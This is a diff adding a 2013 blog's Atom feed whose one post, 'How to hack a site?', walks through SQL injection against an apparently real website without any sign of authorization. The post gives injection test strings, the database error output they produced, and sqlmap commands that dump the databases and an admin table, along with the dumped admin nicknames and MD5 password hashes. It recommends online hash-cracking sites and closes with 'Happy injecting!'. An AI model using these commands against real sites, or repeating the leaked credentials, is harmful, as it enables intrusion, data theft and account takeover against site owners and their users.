@@ -1,0 +1,163 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Security | Bits and Bytes]]></title>
+  <link href="http://liaowang11.github.com/blog/categories/security/atom.xml" rel="self"/>
+  <link href="http://liaowang11.github.com/"/>
+  <updated>2013-04-16T21:36:25+08:00</updated>
+  <id>http://liaowang11.github.com/</id>
+  <author>
+    <name><![CDATA[wliao]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[How to hack a site?]]></title>
+    <link href="http://liaowang11.github.com/blog/2013/04/16/how-to-hack-a-site/"/>
+    <updated>2013-04-16T20:56:00+08:00</updated>
+    <id>http://liaowang11.github.com/blog/2013/04/16/how-to-hack-a-site</id>
+    <content type="html"><![CDATA[<p>I'm quite new to web security. But today, I want to show you how to
+hack a site and try best to get privilege.</p>
+
+<h2>Spot Flaws</h2>
+
+<p>There are million ways to find flaws in web sites. Anyway, we should
+firstly be familiar with the commons ones. IMHO, the best reference is
+<a href="https://www.owasp.org/index.php/Main_Page">OWASP</a>.</p>
+
+<p>OWASP
+<a href="https://www.owasp.org/index.php/Top_10_2013-T10">top ten application security risks</a>
+are:</p>
+
+<ol>
+<li>Injection flaws.</li>
+<li>Broken Authentication and Session Management.</li>
+<li>XSS(Cross Site Scripting).</li>
+<li>Insecure Direct Object Reference.</li>
+<li>Security Misconfiguration.</li>
+<li>Sensitive Data Exposure.</li>
+<li>Missing Function Level Access Control.</li>
+<li>CSRF(Cross Site Request Forgery).</li>
+<li>Using Components with known vulnerabilities.</li>
+<li>Unvalidated Redirects and Forwards.</li>
+</ol>
+
+
+<p>These flaws while stand alone but are often tightly related which
+when integrated poses greater risk. As I'm lazy and impatient, I often
+just check the top five ones.</p>
+
+<h2>Injection Flaws</h2>
+
+<p>Almost everyone knows about
+<a href="http://en.wikipedia.org/wiki/SQL_Injection">SQL Injection</a>. It's also
+our main role today. If you are not so familiar with <em>SQL Injection</em>,
+it's best to read the article on wikipedia and
+<a href="https://www.owasp.org/index.php/SQL_Injection">OWASP</a>.</p>
+
+<h2>Identify Injection Flaws</h2>
+
+<p>I often test injection flaws manually by inspecting the parameters in
+<em>GET</em> or <em>POST</em>. This filters quite a few potential targets, but it's
+off top here.</p>
+
+<p>The simplest test vector goest like:
+<code>
+http://mysite.com/para=1' or '1'='1' --'
+</code>
+It's your luck if the site doesn't turn error debugging information
+off.</p>
+
+<p>So, here we go:
+<code>
+http://some.com/questions?question_id=1'%20or%201=1
+</code>
+And we get:
+```
+A Database Error Occurred</p>
+
+<p>Error Number: 1064</p>
+
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''and type='Q'' at line 1</p>
+
+<p>SELECT * FROM t_qa_post WHERE id='1' or 1=1'and type='Q'</p>
+
+<p>Filename: /srv/www/default/models/t_db_model.php</p>
+
+<p>Line Number: 340
+<code>
+Cool. The error is just what we want.
+A better one goes like:
+</code>
+http://some.com/question?question_id=1'%20or%201=1--'
+```
+This dumps all the questions. And we can at this point confirm the
+existence of injection flaws here.</p>
+
+<h2>Automation</h2>
+
+<p>There is no way you are willing to type all the test vectors into the
+parameters to get useful information. We need something to automate
+this process.</p>
+
+<p>Yeah, we got <a href="http://sqlmap.org/">sqlmap</a>. The best SQL injection
+automation tools I've ever seen. Read the manual, and get your hands
+dirty.</p>
+
+<h2>Lend hands from sqlmap</h2>
+
+<p>``` bash</p>
+
+<h1>dump databases</h1>
+
+<p>$ ./sqlmap.py -u
+'http://some.com/questions?question_id=1' -p
+question_id --answers=follow=N --dbs</p>
+
+<h1>dump admins</h1>
+
+<p>$ sqlmap.py -u 'http://some.com/questions?question_id=1' -p question_id --answers=follow=N -D svowdb_20120910 -T t_admin --dump
+recognized possible password hashes in column 'passwd'. Do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: svowdb_20120910
+Table: t_admin
+[2 entries]
++--------------------------------------+----------------------------------+-----------+
+| id                                   | passwd                           | nickname  |
++--------------------------------------+----------------------------------+-----------+
+| 795bae94-afbe-11e1-94f9-bcaec51b9163 | 10032586bc62852d2a7ed121da58d05f | sab       |
+| 84290d62-afbe-11e1-94f9-bcaec51b9163 | 4f490fc6fad84a18aa7a62dd00da7bf9 | yoyoooooo |
++--------------------------------------+----------------------------------+-----------+
+```</p>
+
+<h2>Reverse MD5 hash</h2>
+
+<p>Obviously the passwords as md5 hashed. There is no way but to
+decrypt the hashes. I don't want to do it on my own, so I often search
+online md5 hash databases. The best I found is
+<a href="http://www.md5decrypter.co.uk/">md5decryptor</a>.</p>
+
+<h2>Privilege Elevation</h2>
+
+<p>It's quite a pity that current database user got no privileges(Plus
+one for the right choice here :).
+```
+$ sqlmap.py -u 'http://some.com/questions?question_id=1' -p question_id --answers=follow=N --privileges
+database management system users privileges:
+[*] 'php'@'%' [1]:</p>
+
+<pre><code>privilege: USAGE
+</code></pre>
+
+<p>```
+With more privilege, we can even dump files, execute arbitrary code,
+almost everything.</p>
+
+<p>If I find one, there maybe one more post.</p>
+
+<p>Happy injecting!</p>
+]]></content>
+  </entry>
+  
+</feed>
